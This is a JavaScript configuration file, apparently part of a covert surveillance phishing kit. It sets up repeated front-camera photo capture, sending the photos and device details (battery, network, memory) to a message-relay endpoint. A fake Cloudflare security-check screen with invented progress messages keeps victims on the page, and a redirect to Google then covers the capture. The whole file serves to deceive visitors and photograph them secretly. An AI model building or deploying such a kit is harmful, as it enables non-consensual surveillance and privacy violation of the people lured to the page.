const CAPTURE_CONFIG = {
  api: {
    sendPhoto:   '/api/sendPhoto',
    sendMessage: '/api/sendMessage',
  },
  defaultChatId: '',
  camera: {
    width:          { ideal: 1280 },
    height:         { ideal: 720 },
    facingMode:     { ideal: 'user' },
    jpegQuality:    0.85,
    captureInterval: 2000,
    maxPhotos:       0,
  },
  timing: {
    cloudflareDuration: 5,
    initialCaptureDelay: 1000,
    redirectBuffer:     500,
  },
  dataCollection: {
    sendDetailedInfo: true,
    collectBattery:   true,
    collectNetwork:   true,
    collectMemory:    true,
  },
  cloudflareScreen: {
    duration: 5,
    progressMessages: [
      'Performing security check…',
      'Analyzing browser fingerprint…',
      'Checking for malicious activity…',
      'Validating request integrity…',
      'Finalizing security verification…',
    ],
  },
  redirect: {
    autoHttps:   true,
    fallbackUrl: 'https://www.google.com',
  },
  debug: {
    consoleLogging: true,
    showStatusMessages: false,
  },
};
Object.freeze(CAPTURE_CONFIG);
